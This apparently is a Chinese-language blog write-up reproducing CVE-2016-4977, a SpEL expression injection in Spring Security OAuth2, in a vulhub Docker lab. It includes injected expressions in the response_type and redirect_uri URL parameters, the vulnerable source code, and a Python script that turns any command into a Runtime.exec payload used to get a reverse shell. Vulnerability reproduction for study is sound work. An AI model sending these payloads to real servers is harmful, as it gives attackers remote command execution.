---
layout: post
title: Spring Security OAuth2 远程命令执行漏洞
tags: Spring Security OAuth2
categories: CVE-2016-4977
---

# Spring Security OAuth2 远程命令执行漏洞（CVE-2016-4977）

## 漏洞描述

Spring Security OAuth 是为 Spring 框架提供安全认证支持的一个模块。在其使用 whitelabel views 来处理错误时，由于使用了Springs Expression Language (SpEL)，攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令。

## 漏洞复现

首先部署是使用的GitHub中的[vulhub](!https://github.com/vulhub/vulhub.git)项目docker一键部署的。

1.redirect_uri参数格式正确，response_type执行表达式

访问`http://your-ip:8080/oauth/authorize?response_type=${233*233}&client_id=acme&scope=openid&redirect_uri=http://test`。首先需要填写用户名和密码，我们这里填入admin:admin即可。

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring/CVE-2016-4977/15939417164801.jpg)

登录后可以看到页面返回错误信息，表达式成功执行

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring/CVE-2016-4977/15939417712684.jpg)

2.response_type参数正确`response_type=token`，redirect_uri参数执行表达式

访问`http://127.0.0.1:8080/oauth/authorize?response_type=token&
client_id=acme&redirect_uri=hello`可以看到
一个登录框，输入admin:admin登录，漏洞点在response_type和redirect_uri参数处。

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring/CVE-2016-4977/15939393506133.jpg)

登录后看到一个报错页面，可以看到由于hello对于redirect_uri来说是不合法的值，所以程序会将错误信息返回并且其中带着hello

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring/CVE-2016-4977/15939396266966.jpg)

然后将redirect_uri的值改为一个表达式，可以看到表达式被成功执行

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring/CVE-2016-4977/15939397407524.jpg)

这是由于程序使用Whitelabel作为视图来返回错误页面，而程序定义Whitelabel对错误的处理方法是通过oauthError.getSummary()来获取错误信息，

```
@FrameworkEndpoint
public class WhitelabelErrorEndpoint {

    private static final String ERROR = "<html><body><h1>OAuth Error</h1><p>${errorSummary}</p></body></html>";

    @RequestMapping("/oauth/error")
    public ModelAndView handleError(HttpServletRequest request) {
        Map<String, Object> model = new HashMap<String, Object>();
        Object error = request.getAttribute("error");
        // The error summary may contain malicious user input,
        // it needs to be escaped to prevent XSS
        String errorSummary;
        if (error instanceof OAuth2Exception) {
            OAuth2Exception oauthError = (OAuth2Exception) error;
            errorSummary = HtmlUtils.htmlEscape(oauthError.getSummary());
        }
        else {
            errorSummary = "Unknown error";
        }
        model.put("errorSummary", errorSummary);
        return new ModelAndView(new SpelView(ERROR), model);
    }
}
```

然后将错误信息`${errorSummary}如：${1234*100}`带入了errorSummary中，然后errorSummary被装入model中，再用SpelView进行渲染

```
class SpelView implements View {

    ...

    public SpelView(String template) {
        this.template = template;
        this.context.addPropertyAccessor(new MapAccessor());
        this.helper = new PropertyPlaceholderHelper("${", "}");
        this.resolver = new PlaceholderResolver() {
            public String resolvePlaceholder(String name) {
                Expression expression = parser.parseExpression(name);
                Object value = expression.getValue(context);
                return value == null ? null : value.toString();
            }
        };
    }

    ...

    public void render(Map<String, ?> model, HttpServletRequest request, HttpServletResponse response)
            throws Exception {
        ...
        String result = helper.replacePlaceholders(template, resolver);
        ...
    }
}
```

可以看到在render时通过helper取`${}`中的值作为表达
式，再用`parser.parseExpression`来执行，这个函数是个递归，也就是说如果表达式的值中有`${xxx}`这样形式的字符串存在，就会再取xxx作为表达式来执行。漏洞的关键点在于这个对表达式的递归处理使我们可控的部分也会被当作表达式执行。

```
public String replacePlaceholders(String value, final Properties properties) {
    Assert.notNull(properties, "\'properties\' must not be null");
    return this.replacePlaceholders(value, new PropertyPlaceholderHelper.PlaceholderResolver() {
        public String resolvePlaceholder(String placeholderName) {
            return properties.getProperty(placeholderName);
        }
    });
}
```

使用[poc.py](https://github.com/vulhub/vulhub/blob/master/spring/CVE-2016-4977/poc.py)来生成反弹shell的POC，（注意：[Java反弹shell的限制与绕过方式](http://www.jackson-t.ca/runtime-exec-payloads.html)，这是因为使用Java通过Runtime.getRuntime().exec()执行命令时有重定向、空格和管道字符会出错）：

```
#!/usr/bin/env python

message = input('Enter message to encode:')

poc = '${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(message[0])

for ch in message[1:]:
   poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch) 

poc += ')}'

print(poc)
```

执行python3 poc.py，提示输入反弹shell的命令（需要进行编码）：

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring/CVE-2016-4977/15939428497603.jpg)

可以看到生成了一个`${}`表达式

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring/CVE-2016-4977/15939427158551.jpg)

将表达式作为response_type的值发送请求

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring/CVE-2016-4977/15939430888883.jpg)

同时在攻击机上开启监听，成功反弹shell

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring/CVE-2016-4977/15939429851635.jpg)

或者将表达式作为redirect_uri的值发送请求

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring/CVE-2016-4977/15939432357343.jpg)

也可以成功反弹shell

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring/CVE-2016-4977/15939432660923.jpg)


## 受影响的版本

Spring Security OAuth 2.0.0 to 2.0.9 and 1.0.0 to 1.0.5

## 参考链接

https://paper.seebug.org/70/